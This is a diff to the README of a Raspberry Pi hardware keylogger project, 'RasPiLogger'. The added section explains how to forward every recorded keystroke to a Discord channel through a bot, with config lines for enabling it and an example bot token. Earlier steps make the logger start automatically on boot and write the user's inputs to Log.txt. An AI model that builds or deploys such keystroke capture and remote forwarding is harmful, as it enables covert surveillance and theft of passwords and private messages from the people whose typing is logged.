@@ -58,7 +58,7 @@ After that you can clone this repo (this repo uses a package "keyboard" from thi
 $ git clone https://github.com/H3LL0U/RasPiLogger.git
 ```
 
-You can delete the files for Raspberry pi pico since they are not being used for this part:
+(You can delete the files for Raspberry pi pico since they are not being used for this part:)
 
 ```
 $ sudo rm -r ~/Scripts/RasPiLogger/"files for RP pico"
@@ -118,6 +118,52 @@ $ sudo systemctl mask ctrl-alt-del.target
 After the reboot this script will be run automatically on startup if everything was done correctly
 
 The Log.txt file which records the user's inputs is going to be saved in the same directory as Log.py file
+
+
+
+#Enabling discord logging:
+(Optional)
+Is it too bothersome to access your RasPiLogger? You can enable discord logging feature!
+
+##Creating a bot
+
+Firstly what you want to do is create a discord bot and add it to your server:
+You can do this using a guide bellow:
+https://www.upwork.com/resources/how-to-make-discord-bot
+After that you will need to copy an ID of the channel you want your bot to Log key inputs to
+You can do that by enabling developer mode in the settings and right clicking on the channel.
+(Save the channel ID and the Bot Token you will need them for the next step)
+
+##Enabling the feature
+
+in the same folder as Log.py there is another file called send_discord.py
+when you open it with
+
+```
+sudo nano ~/Scripts/RasPiLogger/"files for RP zero"/send_discord.py
+```
+
+The begining should look something like this:
+
+```
+import os
+
+ENABLE_DISCORD_LOGGING = False
+YOUR_TOKEN = "Your Token" #Write Your discord bot token here:
+YOUR_CHANNEL_ID = 1235969503771361332 #Write the channel in which you want the bot to write here (takes an integer):
+```
+
+You can set the ENABLE_DISCORD_LOGGING variable to True
+Place the Token of the bot you just created between the quotations
+And as for last place the selected channel ID for YOUR_CHANNEL_ID
+
+In the end it will look something similar to this:
+
+```
+ENABLE_DISCORD_LOGGING = True
+YOUR_TOKEN = "NzY1NTQxNzQ1NzE0NTg3NTQxcX4awOQ.UVT8ef7BvRcd1eJUeJ59xIsJwGc" #Write Your discord bot token here:
+YOUR_CHANNEL_ID = 1235969503771361332 #Write the channel in which you want the bot to write here (takes an integer):
+```
 
 Congratulations! The setup for Raspberry pi zero is done!
 
